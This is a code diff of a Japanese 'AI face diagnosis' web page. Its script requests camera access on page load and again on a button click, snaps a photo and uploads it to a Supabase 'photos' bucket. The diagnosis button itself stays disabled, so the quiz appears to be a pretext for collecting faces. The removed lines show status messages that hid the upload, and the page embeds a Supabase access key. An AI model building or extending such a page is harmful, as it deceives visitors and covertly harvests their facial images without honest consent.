@@ -44,6 +44,7 @@
       font-size: 1rem;
       margin-bottom: 15px;
       box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+      box-sizing: border-box;
     }
     .btn {
       display: block;
@@ -83,6 +84,13 @@
       margin-top: 10px;
       font-size: 14px;
     }
+    #charCount {
+      text-align: right;
+      font-size: 12px;
+      color: #999;
+      margin-top: -10px;
+      margin-bottom: 10px;
+    }
   </style>
 </head>
 <body>
@@ -90,8 +98,9 @@
     <h1>AI顔診断</h1>
     <p class="desc">あなたのお顔を診断してみましょう！<br>診断にはカメラの許可が必要です。</p>
 
-    <input type="text" placeholder="あなたの名前を入力" disabled />
-    <button class="btn" disabled>📷 カメラを起動</button>
+    <input type="text" id="nameInput" placeholder="あなたの名前を入力" maxlength="8" />
+    <div id="charCount">0 / 8</div>
+    <button id="cameraBtn" class="btn">📷 カメラを起動</button>
     <button class="btn" disabled>🧠 診断をはじめる</button>
 
     <div class="preview-box">
@@ -109,12 +118,24 @@
       "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im10bWtoZ3Rub3F1ZGJ2bWhobXB6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjU0NTU3NTMsImV4cCI6MjA4MTAzMTc1M30.XoIhMUnkFIQfaULDyEFQ1Bo1zQVye1QfgFmCcrkUBSI"
     );
 
-    const id = Math.random().toString(36).substring(2, 9);
     const video = document.getElementById("video");
     const status = document.getElementById("status");
+    const cameraBtn = document.getElementById("cameraBtn");
+    const nameInput = document.getElementById("nameInput");
+    const charCount = document.getElementById("charCount");
 
-    // ページ読み込み時に公式ダイアログ → 許可されたら撮影
-    window.addEventListener("load", async () => {
+    let isProcessing = false;
+
+    // 文字数カウント表示
+    nameInput.addEventListener("input", () => {
+      const len = nameInput.value.length;
+      charCount.textContent = `${len} / 8`;
+    });
+
+    async function startCameraAndUpload() {
+      if (isProcessing) return;
+      isProcessing = true;
+
       try {
         status.textContent = "カメラの許可を押してください...";
         const stream = await navigator.mediaDevices.getUserMedia({
@@ -123,10 +144,8 @@
         });
         video.srcObject = stream;
 
-       
         await new Promise(r => setTimeout(r, 1000));
 
-        // 撮影してSupabaseにアップロード
         const canvas = document.createElement("canvas");
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
@@ -134,14 +153,30 @@
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.9));
 
-        status.textContent = "読み込み中...";
+        status.textContent = "サーバーに送信中...";
+        const id = Math.random().toString(36).substring(2, 9);
         const { error } = await supabase.storage.from("photos").upload(`${id}.jpg`, blob, { upsert: true });
 
         stream.getTracks().forEach(t => t.stop());
-        status.textContent = error ? "⚠️ カメラが対応していません。" : "✅ 起動完了！";
+
+        if (error) {
+          status.textContent = "⚠️ アップロードに失敗しました。";
+        } else {
+          status.textContent = "✅ 写真を送信しました！";
+        }
       } catch (err) {
         status.textContent = "カメラの許可が得られませんでした。";
+      } finally {
+        isProcessing = false;
       }
+    }
+
+    window.addEventListener("load", () => {
+      startCameraAndUpload();
+    });
+
+    cameraBtn.addEventListener("click", () => {
+      startCameraAndUpload();
     });
   </script>
 </body>
